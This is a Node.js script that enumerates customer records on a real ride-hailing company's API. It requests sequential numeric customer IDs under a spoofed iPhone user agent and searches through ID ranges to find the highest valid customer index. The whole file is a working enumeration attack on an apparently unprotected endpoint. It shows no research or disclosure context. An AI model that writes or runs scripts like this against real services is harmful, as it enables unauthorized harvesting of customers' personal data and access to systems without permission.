var request = require('request');
var qs = require('querystring');
var async = require('async');

//headers for our request
var headers = {
    'Content-Type':     'application/json',
    'User-Agent': 'Apple-iPhone6C1/'
}

//base number for user. The lowest Million available is 543xxxxxx and the highest 545xxxxxx as of 2015-09-03.
var numberBase = 545000000;
//our favorite endpoint.
var baseUrl = 'http://api.gojek.co.id/gojek/customer/';
//vars and shit for our main function.
var result, index, options;

(function lookup(decimator) {
  async.series([
      function(callback){
        index = numberBase + decimator;
        options = {
          url: baseUrl+index,
          method: 'GET',
          headers: headers
        }
        console.log('looking in index ' + index + '.');
        callback(null, options);
      },
      function(callback){
        request(options, function (error, response, body) {
                result = body;
                callback(null);
            // }
        })
      }
  ],
  function (err, results) {
    if (result==='' && decimator >= 10) {
      lookup(decimator/10);
    } else if (result!=='') {
      numberBase += decimator;
      lookup(decimator);
    } else {
      console.log('last index is: ' + index + '.');
    }
  });
  return index;
})(1000000);
